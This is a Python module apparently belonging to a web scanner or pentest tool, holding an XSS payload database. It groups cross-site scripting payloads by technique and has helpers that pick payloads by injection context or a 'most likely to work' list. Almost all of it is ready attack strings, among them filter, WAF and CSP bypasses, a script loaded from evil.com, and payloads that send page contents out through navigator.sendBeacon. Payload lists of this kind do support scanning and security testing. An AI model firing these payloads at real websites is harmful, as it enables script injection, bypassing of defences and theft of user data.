# XSS Payloads Database - 2026
# Modern XSS payload collection with context-specific bypass techniques

# Basic Script Injection
BASIC_SCRIPT = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>confirm('XSS')</script>",
    "<script>prompt('XSS')</script>",
]

# JavaScript Protocol Injection
JAVASCRIPT_PROTOCOL = [
    "javascript:alert('XSS')",
    "javascript:alert(1)",
    "javascript:confirm('XSS')",
    "javascript:void(alert('XSS'))",
]

# Image-based XSS
IMAGE_XSS = [
    "<img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(1)>",
    "<img src=\"\" onerror=\"alert('XSS')\">",
    "<img src=javascript:alert('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
]

# SVG-based XSS
SVG_XSS = [
    "<svg onload=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s></svg>",
    "<svg><animate onend=alert(1) attributeName=x dur=1s></svg>",
]

# 2026 Event Handler XSS - CSS Animation Triggers
ANIMATION_XSS = [
    "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
    "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>",
    "<style>@keyframes slidein{}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></xss>",
    "<xss style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></xss>",
    "<xss style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></xss>",
]

# 2026 Event Handler XSS - Transition Triggers
TRANSITION_XSS = [
    "<xss style=\"transition:color 1s\" ontransitionstart=\"alert(1)\"></xss>",
    "<xss style=\"transition:outline 1s\" ontransitionend=\"alert(1)\" tabindex=1></xss>",
    "<xss style=\"transition:transform 2s\" ontransitionrun=\"alert(1)\"></xss>",
    "<xss style=\"transition:color 10s\" ontransitioncancel=\"alert(1)\"></xss>",
]

# 2026 Event Handler XSS - Media Triggers
MEDIA_XSS = [
    "<audio oncanplay=alert(1)><source src=\"data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT</audio>",
    "<video oncanplaythrough=alert(1)><source src=\"data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAs1tZGF0AAACrgYF//+q3EXpvebZSLeWLNgg2SPu73gyNjQgLSBjb3JlIDE0OCByMjYwMSBhMGNkN2QzIC0gSC4yNjQvTVBFRy00IEFWQyBjb2RlYyAtIENvcHlsZWZ0IDIwMDMtMjAxNSAtIGh0dHA6Ly93d3cudmlkZW9sYW4ub3JnL3gyNjQuaHRtbCAtIG9wdGlvbnM6IGNhYmFjPTEgcmVmPTMgZGVibG9jaz0xOjA6MCBhbmFseXNlPTB4MzoweDExMyBtZT1oZXggc3VibWU9NyBwc3k9MSBwc3lfcmQ9MS4wMDowLjAwIG1peGVkX3JlZj0xIG1lX3JhbmdlPTE2IGNocm9tYV9tZT0xIHRyZWxsaXM9MSA4eDhkY3Q9MSBjcW09MCBkZWFkem9uZT0yMSwxMSBmYXN0X3Bza2lwPTEgY2hyb21hX3FwX29mZnNldD0tMiB0aHJlYWRzPTEgbG9va2FoZWFkX3RocmVhZHM9MSBzbGljZWRfdGhyZWFkcz0wIG5yPTAgZGVjaW1hdGU9MSBpbnRlcmxhY2VkPTAgYmx1cmF5X2NvbXBhdD0wIGNvbnN0cmFpbmVkX2ludHJhPTAgYmZyYW1lcz0zIGJfcHlyYW1pZD0yIGJfYWRhcHQ9MSBiX2JpYXM9MCBkaXJlY3Q9MSB3ZWlnaHRiPTEgb3Blbl9nb3A9MCB3ZWlnaHRwPTIga2V5aW50PTI1MCBrZXlpbnRfbWluPTEwIHNjZW5lY3V0PTQwIGludHJhX3JlZnJlc2g9MCByY19sb29rYWhlYWQ9NDAgcmM9Y3JmIG1idHJlZT0xIGNyZj0yMy4wIHFjb21wPTAuNjAgcXBtaW49MCBxcG1heD02OSBxcHN0ZXA9NCBpcF9yYXRpbz0xLjQwIGFxPTE6MS4wMACAAAAAD2WIhAA3//728P4FNjuZQQAAAu5tb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAZAABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAACGHRyYWsAAABcdGtoZAAAAAMAAAAAAAAAAAAAAAEAAAAAAAAAZAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAgAAAAIAAAAAACRlZHRzAAAAHGVsc3QAAAAAAAAAAQAAAGQAAAAAAAEAAAAAAZBtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAAAwAAAAKdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAA</video>",
    "<audio autoplay onended=alert(1)><source src=\"data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT</audio>",
    "<audio autoplay onplay=alert(1)><source src=\"data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT</audio>",
]

# 2026 Event Handler XSS - Focus Triggers
FOCUS_XSS = [
    "<a tabindex=1 onfocus=alert(1)></a>",
    "<xss onfocus=alert(1) autofocus tabindex=1>",
    "<a tabindex=1 onfocusin=alert(1)></a>",
]

# 2026 Event Handler XSS - Modern HTML5 Elements
HTML5_XSS = [
    "<details ontoggle=alert(1) open>test</details>",
    "<input type=hidden oncontentvisibilityautostatechange=alert(1) style=\"content-visibility:auto\">",
    "<xss oncontentvisibilityautostatechange=alert(1) style=\"display:block;content-visibility:auto\">",
]

# 2026 Event Handler XSS - Error and Exception Handling
ERROR_XSS = [
    "<audio src/onerror=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
]

# 2026 Event Handler XSS - Advanced Bypass Techniques
BYPASS_XSS = [
    "<xss onbeforescriptexecute=alert(1)><script>1</script>",
    "<xss onafterscriptexecute=alert(1)><script>1</script>",
    "<body onsecuritypolicyviolation=alert(1)>",
    "<xss onsecuritypolicyviolation=alert(1)>XSS</xss>",
]

# Encoding-based XSS
ENCODING_XSS = [
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
]

# DOM-based XSS Payloads
DOM_XSS = [
    "#<img src=x onerror=alert(1)>",
    "#<script>alert(1)</script>",
    "javascript:alert(1)",
]

# Filter Bypass Techniques
FILTER_BYPASS = [
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>alert(/XSS/.source)</script>",
    "<script>alert(atob('WFNT'))</script>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<iframe src=javascript:alert(1)>",
]

# CSP Bypass Techniques
CSP_BYPASS = [
    "<script src='data:text/javascript,alert(1)'></script>",
    "<script src='https://evil.com/evil.js'></script>",
    "<meta http-equiv='Content-Security-Policy' content='script-src *'>",
]

# 2026 Event Handler XSS - WebKit Specific
WEBKIT_XSS = [
    "<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>",
    "<xss style=\"transition:color 1s\" onwebkittransitionend=alert(1)></xss>",
]

# 2026 Event Handler XSS - Print Events
PRINT_XSS = [
    "<body onafterprint=alert(1)>",
]

# 2026 Event Handler XSS - Mouse Events
MOUSE_XSS = [
    "<input onauxclick=alert(1)>",
    "<xss onclick=alert(1) style=display:block>test</xss>",
    "<xss oncontextmenu=alert(1) style=display:block>test</xss>",
    "<xss ondblclick=alert(1) tabindex=1>test</xss>",
]

# 2026 Event Handler XSS - Text Manipulation Events
TEXT_XSS = [
    "<a contenteditable onbeforecopy=alert(1)>test</a>",
    "<a contenteditable onbeforecut=alert(1)>test</a>",
    "<xss contenteditable onbeforeinput=alert(1)>test</xss>",
    "<xss onbeforepaste=alert(1)>XSS</xss>",
    "<xss oncopy=alert(1) contenteditable>test</xss>",
    "<xss oncut=alert(1) contenteditable>test</xss>",
]

# 2026 Event Handler XSS - Form/Dialog Events
FORM_XSS = [
    "<input type=file oncancel=alert(1)>",
    "<input onchange=alert(1) value=xss>",
    "<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form></dialog>",
    "<button commandfor=test command=show-popover>Click</button><div id=test oncommand=alert(1)>",
]

# 2026 Event Handler XSS - Focus/Blur Events
FOCUS_BLUR_XSS = [
    "<xss tabindex=1 onblur=alert(1)>test</xss>",
]

# 2026 Event Handler XSS - Drag/Drop Events
DRAG_XSS = [
    "<xss draggable=true ondrag=alert(1)>test</xss>",
]

# 2026 Event Handler XSS - Toggle/Popover Events
TOGGLE_XSS = [
    "<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>XSS</xss>",
    "<xss ontoggle=alert(1) popover>XSS</xss>",
]

# 2026 Event Handler XSS - Advanced Mouse Events
MOUSE_ADVANCED_XSS = [
    "<xss onmouseleave=alert(1) style=display:block>test</xss>",
    "<xss onmousemove=alert(1) style=display:block>test</xss>",
    "<xss onmouseout=alert(1) style=display:block>test</xss>",
    "<xss onmouseover=alert(1) style=display:block>test</xss>",
    "<xss onmouseup=alert(1) style=display:block>test</xss>",
    "<xss onmousewheel=alert(1) style=display:block>requires scrolling</xss>",
]

# 2026 Event Handler XSS - Pointer Events
POINTER_XSS = [
    "<xss onpointercancel=alert(1)>XSS</xss>",
    "<xss onpointerdown=alert(1) style=display:block>XSS</xss>",
    "<xss onpointerenter=alert(1) style=display:block>XSS</xss>",
    "<xss onpointerleave=alert(1) style=display:block>XSS</xss>",
    "<xss onpointermove=alert(1) style=display:block>XSS</xss>",
    "<xss onpointerout=alert(1) style=display:block>XSS</xss>",
    "<xss onpointerover=alert(1) style=display:block>XSS</xss>",
    "<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>",
    "<xss onpointerup=alert(1) style=display:block>XSS</xss>",
]

# 2026 Event Handler XSS - Media Navigation Events
MEDIA_NAV_XSS = [
    "<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>",
    "<audio autoplay controls onpause=alert(1)><source src=validaudio.wav></audio>",
    "<audio autoplay controls onratechange=alert(1)><source src=validaudio.wav></audio>",
    "<audio autoplay controls onseeked=alert(1)><source src=validaudio.wav></audio>",
    "<audio autoplay controls onseeking=alert(1)><source src=validaudio.wav></audio>",
]

# 2026 Event Handler XSS - Page Navigation Events
PAGE_NAV_XSS = [
    "<body onpagehide=navigator.sendBeacon('//example.com',document.body.innerHTML)>",
    "<body onpageswap=navigator.sendBeacon('//example.com',document.body.innerHTML)>",
    "<body onselectionchange=alert(1)>select</body>",
    "<body onselectstart=alert(1)>select</body>",
    "<body onwheel=alert(1)>",
]

# 2026 Event Handler XSS - Form/Text Events
FORM_ADVANCED_XSS = [
    "<form onreset=alert(1)><input type=reset></form>",
    "<form onsubmit=alert(1)><input type=submit></form>",
    "<input type=search onsearch=alert(1) value='Hit return'>",
    "<input onselect=alert(1) value='XSS'>",
    "<a onpaste=alert(1) contenteditable>test</a>",
]

# WAF Bypass Techniques
WAF_BYPASS = [
    "<!--<script>alert(1)</script>-->",
    "<script>alert(1)</script><!--",
    "<script>alert(1)</script> <!--",
    "<script>alert(1);</script>",
    "<script type='text/javascript'>alert(1)</script>",
    "<script language='javascript'>alert(1)</script>",
]

# Payload Categories for Context Selection
PAYLOAD_CATEGORIES = {
    "basic": BASIC_SCRIPT,
    "javascript_protocol": JAVASCRIPT_PROTOCOL,
    "image": IMAGE_XSS,
    "svg": SVG_XSS,
    "animation": ANIMATION_XSS,
    "transition": TRANSITION_XSS,
    "media": MEDIA_XSS,
    "focus": FOCUS_XSS,
    "html5": HTML5_XSS,
    "error": ERROR_XSS,
    "bypass": BYPASS_XSS,
    "encoding": ENCODING_XSS,
    "dom": DOM_XSS,
    "filter_bypass": FILTER_BYPASS,
    "csp_bypass": CSP_BYPASS,
    "waf_bypass": WAF_BYPASS,
    "webkit": WEBKIT_XSS,
    "print": PRINT_XSS,
    "mouse": MOUSE_XSS,
    "text": TEXT_XSS,
    "form": FORM_XSS,
    "focus_blur": FOCUS_BLUR_XSS,
    "drag": DRAG_XSS,
    "toggle": TOGGLE_XSS,
    "mouse_advanced": MOUSE_ADVANCED_XSS,
    "pointer": POINTER_XSS,
    "media_nav": MEDIA_NAV_XSS,
    "page_nav": PAGE_NAV_XSS,
    "form_advanced": FORM_ADVANCED_XSS,
}

# Priority Payloads (most likely to work) - Updated for 2026
PRIORITY_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
    "<details ontoggle=alert(1) open>test</details>",
    "<a tabindex=1 onfocus=alert(1)></a>",
    "javascript:alert(1)",
    "<xss onclick=alert(1) style=display:block>test</xss>",
    "<xss onmouseover=alert(1) style=display:block>test</xss>",
    "<xss onpointerdown=alert(1) style=display:block>XSS</xss>",
    "<input onchange=alert(1) value=xss>",
    "<form onsubmit=alert(1)><input type=submit></form>",
    "<audio oncanplay=alert(1)><source src=\"data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT</audio>",
    "<xss style=\"transition:color 1s\" ontransitionstart=\"alert(1)\"></xss>",
    "<xss draggable=true ondrag=alert(1)>test</xss>",
]

# All Payloads Combined
ALL_XSS_PAYLOADS = []
for category, payloads in PAYLOAD_CATEGORIES.items():
    ALL_XSS_PAYLOADS.extend(payloads)

def get_payloads_by_context(context_type):
    """Get payloads suitable for specific context"""
    if context_type == "url_parameter":
        return JAVASCRIPT_PROTOCOL + BASIC_SCRIPT + ENCODING_XSS
    elif context_type == "html_input":
        return IMAGE_XSS + SVG_XSS + BASIC_SCRIPT
    elif context_type == "html_attribute":
        return JAVASCRIPT_PROTOCOL + FOCUS_XSS
    elif context_type == "javascript":
        return BYPASS_XSS + FILTER_BYPASS
    else:
        return PRIORITY_PAYLOADS

def get_priority_payloads():
    """Get the most effective payloads"""
    return PRIORITY_PAYLOADS[:10]  # Top 10 priority payloads

def get_all_payloads():
    """Get all available payloads"""
    return ALL_XSS_PAYLOADS